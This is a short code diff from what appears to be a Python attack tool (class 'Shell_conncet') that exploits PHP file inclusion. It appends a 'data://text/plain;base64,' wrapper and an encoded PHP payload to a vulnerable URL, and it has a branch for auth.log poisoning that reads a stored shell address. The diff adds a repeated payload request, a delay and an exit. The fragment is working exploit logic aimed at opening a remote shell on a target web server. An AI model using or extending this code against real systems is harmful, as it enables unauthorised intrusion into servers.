@@ -90,9 +90,10 @@ class Shell_conncet:
                                     ('password',f'{self.args.password}')]  
                 PHPWAPPER = "data://text/plain;base64,"                   
                 self.url =  self.args.Vulnurl + PHPWAPPER +self.paylaodPHP    
-                print(self.url)              
                 first_req = request.open(self.url).read()
-
+                time.sleep(1)
+                first_req = request.open(self.url).read()
+                exit()
         elif  "auth" in  self.url or "auth.log" in  self.url :                  
                 if os.path.exists('./Package/shell/.address'): 
                     with open ('./Package/shell/.address','r') as readHost:
